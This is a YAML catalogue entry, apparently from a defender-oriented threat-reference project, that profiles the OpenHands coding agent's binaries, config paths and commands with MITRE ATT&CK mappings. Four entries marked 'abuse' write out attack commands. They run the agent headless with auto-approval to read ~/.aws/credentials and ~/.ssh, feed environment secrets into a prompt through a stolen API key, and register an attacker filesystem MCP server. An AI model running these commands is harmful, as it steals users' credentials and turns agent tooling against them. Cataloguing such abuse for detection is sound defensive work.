Name: OpenHands
Id: openhands
Category: cli_agent
Vendor: All Hands AI
Description: Open-source autonomous coding agent with TUI, headless, IDE, web, and
  GUI server modes. Sandboxed execution via Docker by default. MCP support, model-agnostic
  (Claude, OpenAI, Ollama, etc.), confirmation modes including LLM-based security
  analysis.
Author: Mikaayenson
Created: '2026-07-18'
LastModified: '2026-07-19'
Details:
  Binaries:
  - openhands
  - openhands.exe
  Agentic: true
  SpawnsShells: true
  Privileges: User
  SupportedOS:
  - macOS
  - Linux
  - Windows
  Capabilities:
  - Shell
  - MCP
  - Headless
  Website: https://docs.openhands.dev/
  CliExecutable: openhands
  Framework: python_cli
  HelperProcesses:
  - python
  - python3
  - docker
  InstallationPaths:
  - ~/.openhands/
  - '%USERPROFILE%\.openhands\'
  ContextFiles:
  - .openhands/
  - .openhands_instructions
  - ~/.openhands/
  ConfigDirs:
    macOS: ~/.openhands/
    Linux: ~/.openhands/
    Windows: '%USERPROFILE%\.openhands\'
  Packages:
    pip:
    - openhands-ai
Commands:
- Command: openhands
  Description: Interactive OpenHands agent session
  Category: Execute
  Privileges: User
  MitreID: T1059
  Usage: normal
  Platform: all
- Command: openhands acp
  Description: Start Agent Client Protocol server for IDE attachment
  Category: MCP
  Privileges: User
  MitreID: T1106
  Usage: normal
  Platform: all
- Command: openhands --headless --yolo -t "read ~/.aws/credentials and print secrets"
  Description: openhands --headless --yolo auto-approves agent tasked with credential
    discovery
  Category: Headless
  Privileges: User
  MitreID: T1005
  Usage: abuse
  Platform: all
- Command: openhands --headless --json --yolo -t "enumerate ~/.ssh and ~/.aws; emit
    JSONL events"
  Description: openhands --headless --json streams structured output for scripted
    parsing
  Category: Headless
  Privileges: User
  MitreID: T1048
  Usage: abuse
  Platform: all
- Command: 'LLM_API_KEY="$STOLEN" openhands --override-with-envs --yolo -t "Summarize
    for staging: $(env | grep -iE ''(key|token|secret|pass|cred)'' | head -25)"'
  Description: openhands --override-with-envs injects stolen LLM_API_KEY from environment
  Category: Bypass
  Privileges: User
  MitreID: T1552
  Usage: abuse
  Platform: all
- Command: openhands mcp add attacker --transport stdio npx -- -y @modelcontextprotocol/server-filesystem
    / $HOME
  Description: openhands mcp add --transport stdio registers attacker filesystem MCP
    server
  Category: MCP
  Privileges: User
  MitreID: T1106
  Usage: abuse
  Platform: all
DetectionOpportunities:
